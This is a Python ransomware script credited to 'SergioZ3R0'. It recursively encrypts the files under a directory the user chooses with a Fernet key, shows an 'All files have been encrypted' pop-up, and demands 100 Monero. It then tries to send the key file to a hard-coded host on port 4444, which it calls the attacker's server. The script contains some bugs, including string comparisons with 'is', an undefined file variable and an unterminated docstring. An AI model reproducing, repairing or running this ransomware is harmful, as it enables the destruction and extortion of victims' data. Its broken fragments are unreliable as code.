# Author: SergioZ3R0
import subprocess
import sys
import os
import ctypes
import socket
from datetime import datetime, timedelta
#Install cryptography module
def install(package): # Install the required package
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

install('cryptography') # Install the cryptography package
from cryptography.fernet import Fernet

files = [] # List to store the files in the current directory
def recorrer_arbol_directorios(directory):
    global files
    try:
        for file in os.listdir(directory):
            rute_element = os.path.join(directory, file)
            if not os.path.islink(rute_element):
                if os.path.isdir(rute_element):
                    # Ignora los directorios relacionados con Python
                    if "python" in rute_element.lower():
                        continue
                    print("Directory:", rute_element)
                    recorrer_arbol_directorios(rute_element)
                else:
                    # Ignora los archivos relacionados con Python
                    if file.endswith('.py') or file == "darthvader.py" or file == "key.key" or file == "decrypt.py" or file == "encryption_time.txt":
                        continue
                    print("File:", rute_element)
                    files.append(rute_element)
    except Exception as e:
        print("Mondongo")
    print(files)

def send_file_to_host(file_path, host, port): # Send the key file to the attacker
    if file_path is "key.key":
        with open(file_path, 'rb') as file:
            data = file.read()
    elif file_path is "encryption_time.txt":
        with open(file_path, 'r') as file:
            data = datetime.fromisoformat(f.read().strip())

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: # Create a socket object
        s.connect((host, port)) # Connect to the attacker's server
        s.sendall(data) # Send the file
#### Main

recorrer_arbol_directorios(input("Introduce la ruta del directorio inicial: "))

key = Fernet.generate_key() # Generate a key

with open("key.key", "wb") as key_file: # Open the key file in write binary mode
    key_file.write(key) # Write the key to the file

# Encrypt the files
for file in files:
    try:
        with open(file, "rb") as f: # Open the file in read binary mode
            data = f.read()
        data_encrypted = Fernet(key).encrypt(data) # Encrypt the file
        with open(file, "wb") as f:
            f.write(data_encrypted) # Write the encrypted data to the file
    except Exception as e:
        print(f"Error encrypting file {file}: {e}")

if sys.platform == "linux":
    subprocess.Popen(['zenity', '--info', '--text=' + "All files have been encrypted!"])
else:
    ctypes.windll.user32.MessageBoxW(0, "All file have been encrypted", "Notification", 1)
print("All files encrypted! Send me 100 Monero(XMR) to my wallet(WALLET)")


# Usage: send_file
try:    # Send the key file to the attacker
    send_file_to_host('key.key', '172.22.9.204', 4444)
    send_file_to_host("encryption_time.txt", "IP", 4444)
except:
    print("Error sending key file Unreachable host")
# Store the encryption time
with open("encryption_time.txt", "w") as f:
    f.write(str(datetime.now()))
# Read the encryption time from the file

with open("encryption_time.txt", "r") as f:
    encryption_time = datetime.fromisoformat(f.read().strip())

#Delete the randsomware
#os.remove("darthvader.py")
"""